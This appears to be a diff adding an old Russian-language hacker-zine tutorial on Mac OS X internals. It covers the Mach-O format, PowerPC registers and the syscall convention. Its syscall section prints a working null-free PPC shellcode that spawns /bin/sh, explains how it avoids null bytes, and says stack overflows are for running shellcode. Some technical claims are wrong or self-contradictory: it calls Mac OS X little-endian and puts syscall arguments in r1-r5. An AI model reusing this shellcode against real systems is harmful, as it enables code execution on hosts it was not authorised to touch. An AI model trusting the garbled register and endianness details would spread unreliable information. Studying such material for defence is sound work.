@@ -1,0 +1,190 @@
+                                                           _   _:.
+                                                            :$$$$$
+         _   .     - +.                                    :l$││$$
+   s┐┐,,_  +:@QSSS$$$$$                                     ``
+   $$$$$$$$bs┐.`"┘?$$$l      [ short look at MacOS X ]
+   '└└?$$│$$$$b┐_  .       [ madcr ] 
+            `"└$│$b.   .    
+                  `└?b.  `.  
+                     `┘.   +
+                      `$   _.
+                        `
+
+
+  [-] intro. 
+  [--] power pc. registers set, instructions.
+  [---] mac os x assembler. systemcalls.
+  [--] fun with stack.
+  [-] references.
+
+
+ -[[ intro
+
+ Первым делом стоит сказать, что ядром MacOs X является  Darwin. Darwin писался
+ непосредственно Apple для PPC процов, но в настоящее время есть и порт на x86.
+ (Только ядра. Портирования самой MacOs X на x86 в планах Apple нет).Упомянул я
+ об этом потому,как некоторые считают Darwin функциональной осью,в то время как
+ это  только  лишь кернел, который, кстати сказать, основан на микроядре Mach с
+ взятыми у FreeBSD надстройками (syscalls).
+
+ В  роли  исполнимых  файлов  в  MacOS X могут использоваться 3 типа исполнимых
+ файлов.  Mach-O  тип является нативным для macos x. Разбирать их по аналогии с
+ Alpha желания не было,но в связи с тем,что они довольно необычные я все же это
+ мельком сделаю. Необычные они тем, что помимо всего в файле есть load команды:
+
+ from include/mach-o/loader.h:
+
+-------
+ The load commands directly follow the mach_header.The total size of all of the
+ commands is given by the sizeofcmds field in the mach_header.All load commands
+ must have as their first two fields cmd and cmdsize.The cmd field is filled in
+ with  a  constant  for  that  command  type. Each command type has a structure
+ specifically for it.  The cmdsize field is the size in bytes of the particular
+ load  command  structure  plus anything that follows it that is a part of  the
+ load command (i.e. section structures, strings, etc.).  To advance to the next
+ load  command the cmdsize can be added to the offset or pointer of the current
+ load command. The cmdsize MUST be a  multiple of 4 bytes (this  is forever the
+ maximum  alignment  of any load commands). The padded bytes must  be zero. All 
+ tables  in  the  object  file  must also follow these rules so the file can be
+ memory mapped. Otherwise the pointers to these tables will not work well or at
+ all on some machines.  With all padding  zeroed like objects will compare byte 
+ for byte.
+-------
+
+ Например в стандартном экзешнике идет 3 load segment команды:
+
+  1-st lc_segment  - __PAGEZERO
+  2-st lc_segment  - __TEXT                     
+  3-st lc_segment  - __LINKEDIT (if not use -noseglinkedit)
+                            
+ Одна lc_symtab и  одна lc_unixthread. Заголовки секций (если они есть), идут в
+ lc_segment командах (unsigned long  nsects; // number of sections in segment).
+ В обычном случае в _TEXT после load команды идет заголовок,описывающий  секцию
+ кода. Как написано выше,для каждой load команды свой формат. Всего их 24 и все
+ их структуры описаны в include/mach-o/loader.h. Особо интересна lc_segment:
+
+ struct segment_command 
+ {
+        unsigned long   cmd;            /* LC_SEGMENT                      */
+        unsigned long   cmdsize;        /* includes sizeof section structs */
+        char            segname[16];    /* segment name                    */
+        unsigned long   vmaddr;         /* memory address of this segment  */
+        unsigned long   vmsize;         /* memory size of this segment     */
+        unsigned long   fileoff;        /* file offset of this segment     */
+        unsigned long   filesize;       /* amount to map from the file     */
+        vm_prot_t       maxprot;        /* maximum VM protection           */
+        vm_prot_t       initprot;       /* initial VM protection           */
+        unsigned long   nsects;         /* number of sections in segment   */
+        unsigned long   flags;          /* flags                           */
+ };
+
+ vmaddr,vmsize,maxprot,initprot .. багов я уверен здесь просто вагон. пробуйте.
+ 
+ ps. кстати в mach-o заголовке, magic битами является 0xFEEDFACE. Так что hello
+ разработчикам кисовых бинарей ;)
+
+
+ -[[ power pc. registers set, instructions 
+
+ Power PC  также  как и Alpha  основан на  risc технологии, а это  также значит
+ большое количество регистров и тройные конструкции. И также как и на Aplha нет
+ непосредственных инструкций по работе со стеком, что компенсируется read/write
+ с нужных адресов стека (stmw rXX,-8(r1), lwz rXX,-8(r1)).Основные регистры для
+ нас, опять же, как и в случае с Alpha, 32 integer регистра c $r0 по $r31.
+ (/usr/include/architecture/ppc/reg_help.h):
+
+                   
+        r0      -  zt       - architecturally 0 for mem refs only!
+        r1      -  sp       - stack pointer
+        r2      -  toc      - table of contents
+        r3-r10  -  a0-a7    - first 8 args
+        r11     -  ep       - environment ptr
+        r12     -  at       - assembler temp
+        r13-r30 -  s17-s0   - callee-saved 17 - 0
+        r31     -  fp       - frame-pointer.
+
+
+ Из  специальных  регистров  нас волнует только 1 - lr, т.к. он содержит адреса
+ возврата.
+
+ Power  PС  могут работать как в little, так и big endian режимах (LE бит в MSR
+ регистре).  Для AIX это big endian, для MacOS X little. Инструкции 4х байтные,
+ имеют почти 12 форматов, и основными типами можно выделить такие:
+
+
+   Load and store      - загружать непосредственно константы и двигать 
+                          дату между памятью и регистрами: stw r0,8(r1)  
+                          - содержимое r0 записать по адресу в r1+8.
+
+   Arithmetic          - математика:
+                          addi r6,r1,300   // в r6 - r1+300
+
+   Logical and shift   - логика: xor r5,r5,r5 
+
+   Relational          - сравнение
+
+   Move                - двигать дату: mtcrf,mcrxr,etc
+
+   Control             - джампы,условные/безусловные переходы и тд:
+                          bcl 20,31,real_start
+                          b string
+                          bl aga
+
+   Special-purpose     - специального назначения. 'sc' как пример.
+
+ На самом деле типов инструкций у ppc более 40,и более правильно будет почитать
+ что-нибудь из [1].
+
+
+ -[[ mac os x assembler. systemcalls.
+
+ Ассемблер обычный gnu as. Вызов сискала через sc инструкцию. Cписок сискалов в
+ /usr/include/sys/syscall.h (как я писал в intro, заимствованы они с  FreeBSD).
+ Работаем так: в r0 номер сискала, в r1-r5 аргументы, и вызываем sc инструкцию:
+
+ "\x38\x40\x69\x6e"  //  li r2,0x696e
+ "\x3c\x02\x2f\x62"  //  addis r0,r2,lo16(0x2f62)  // r0 have /bin (0x2f62696e)
+ "\x38\x40\x73\x68"  //  li r2,0x7368
+ "\x3c\x42\x2f\x2f"  //  addis r2,r2,lo16(0x2f2f)  // r2 have //sh (0x2f2f7368)
+ "\x7c\xa5\x2a\x78"  //  xor r5,r5,r5     // r5 = null
+ "\x38\xc1\x01\x2c"  //  addi r6,r1,300   // in r6 - r1+300
+ "\x90\x06\xfe\xd8"  //  stw r0,-296(r6)  // in stack /bin (300-296=4)
+ "\x90\x46\xfe\xdc"  //  stw r2,-292(r6)  // in stack //sh (300-292=8)
+ "\x90\xa6\xfe\xe0"  //  stw r5,-288(r6)  // NULL in stack after /bin//sh (300-288=12)
+ "\x38\x66\xfe\xd8"  //  addi r3,r6,-296  // in r3 addr on /bin/sh  (4)
+ "\x90\x66\xfe\xe4"  //  stw r3,-284(r6)  // addr on /bin/sh in stack (16)
+ "\x38\x86\xfe\xe4"  //  addi r4,r6,-284  // addr on addr on /bin/sh in r4 (16)
+ "\x90\xa6\xfe\xe8"  //  stw r5,-280(r6)  // NULL in stack after addr to /bin//sh (20)
+ "\x7c\x42\x12\x78"  //  xor r2,r2,r2     // r2 = null
+ "\x7c\xc6\x32\x78"  //  xor r6,r6,r6
+ "\x38\xc6\x01\x2c"  //  addi r6,r6,300
+ "\x38\xc6\xff\x0f"  //  addi r6,r6,-241
+ "\x7c\xc0\x33\x78"  //  mr r0,r6          // r0 = 59 (3b,execve)
+ "\x44\xff\xaa\x02"  //  .byte 0x44,0xff,0xaa,0x02   // sc
+ 
+ Интересным моментом тут является сама sc инструкция. По умолчанию генерируется
+ опкод 0x44000002. И чтобы избавиться от этих нулей,читаем instructions manual:
+
+ sc opcode:
+                                           
+        1st byte           2st byte           3st byte           4st byte
+
+    0-1-0-0-0-1-r-r    r-r-r-r-r-r-r-r    r-r-r-r-r-r-r-r    r-r-r-r-r-r-1-r
+
+ r - зарезервированные биты. Могут быть каким угодно хламом, главное процессору
+ это 1ый и 4байт. Поэтому я просто от  балды сую 0xffaa. Также от  нулей в addi
+ я избавляюсь высчитыванием разницы между значениями, которые больше 0xff.
+ 
+
+ -[[ fun with stack.
+
+ Все практически также как и в случае с tru64. Для хранения ret адресов юзаем
+ $lr + stack. 
+
+ And then ...
+ We overwrite EIP to point back into the stack and execute our shellcode ..
+
+ -[[ references
+
+ [1] Some PPC User's Manuals
+ [2] MacOS X includes
